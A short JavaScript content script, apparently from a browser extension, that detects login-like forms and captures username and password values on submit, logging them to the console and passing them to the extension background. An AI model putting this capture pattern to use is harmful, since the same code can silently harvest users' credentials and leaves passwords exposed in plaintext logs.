const types = /text|url|password|email/i;
const ids = /user|name|pass|mail|url|server|site/i;

const forms = document.forms;

for(let i = 0; i < forms.length; i++) {
  let track = false;
  for(let j = 0; j < forms[i].length; j++) {
    let element = forms[i][j];
    if (types.test(element.type) && (ids.test(element.id) || ids.test(element.name))) {
      track = true;
    }
  }

  if (track) {
    console.log("TRACKING FORM", forms[i]);
    forms[i].addEventListener("submit", (event) => {
      fields = {};
      let form = event.target;
      for (let t = 0; t < form.length; t++) {
        let element = form[t];
        if (types.test(element.type) && (ids.test(element.id) || ids.test(element.name))) {
          fields[element.name] = element.value;
          console.log(element.name, element.value);
        }
      }
      browser.runtime.sendMessage({ fields });
    });
  }
}

